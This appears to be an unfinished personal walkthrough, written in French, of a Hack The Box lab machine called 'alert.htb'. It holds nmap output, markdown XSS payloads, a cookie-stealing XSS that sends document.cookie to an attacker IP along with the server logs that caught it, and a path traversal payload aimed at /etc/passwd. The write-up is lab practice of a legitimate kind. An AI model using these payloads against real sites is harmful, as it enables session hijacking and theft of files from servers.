@@ -1,0 +1,64 @@
+10.10.11.44
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 01:20 CET
+Nmap scan report for 10.10.11.44
+Host is up (0.015s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
+
+Il y a un site web (alert.htb)
+
+On va tester une vuln xss qui ermet d'utiliser le module [Click Me] de markdown qui le transforme en <a> sur de l'html
+
+[Click Me](javascript:alert('Uh oh...'))
+
+-> ne fonctionne pas
+
+On va essayer de juste intégrer du code html dans le markdown
+
+<a href="javascript:alert('XSS')">Click Me</a>
+
+ça marche mais comment l'utiliser ?
+
+Je vais essayer de trouver s'il y a pas de page de connxion ou de sous domaine
+
+-> rien
+
+On va essayer de faire une XSS puis d'envoyer avec le bouton partager à un admin en envoyant le lien dans une request contact us
+
+<img src="0" onerror="fetch('http://10.10.14.12/catch.php?cookie='+document.cookie);"/>
+
+ça marche mais je récupère pas de cookie
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.14.12 - - [25/Nov/2024 19:01:56] "GET /catch.php?cookie= HTTP/1.1" 200 -
+10.10.14.12 - - [25/Nov/2024 19:02:31] "GET /catch.php?cookie= HTTP/1.1" 304 -
+10.10.11.44 - - [25/Nov/2024 19:02:56] "GET /catch.php?cookie= HTTP/1.1" 200 -
+10.10.11.44 - - [25/Nov/2024 19:03:24] "GET /catch.php?cookie= HTTP/1.1" 200 -
+
+-> Les deux dernière requête provienne du site HTB donc la XSS fonctionne masi je ne récupère pas de cookie
+
+En cherchant j'ai peut être trouvé une vuln avec markdown qui permettrais de récupérer des fichiers du serveur en utilisant un payload comme le suivant :
+
+
+![notimage.png](../../../../../etc/passwd)
+
+J'ai pour le moment pas tous compris mais on va tester avec burp suite 
+
+-> pas d'erreur mais pas d'affichage du fichier 
+
+Dans l'explication de l'exploit le hacker obtient un lien en réponse à sa requête qui lui permet de télécharger les fichiers qu'il veut et donc d'obtenir n'importe quel fichier
+
+Le fait qu'il y ai le share markdown et que l'on ai vraiment une réponse sur notre serveur me fait vraiment penser à une XSS mais je n'arrive pas à récupérer un cookie
+
+Je vais essayer de voir s'il n'y a pas une piste sur le forum HTB de la machine
+
+Il y apparement un sous domaine et une XSS a trouver
+
+
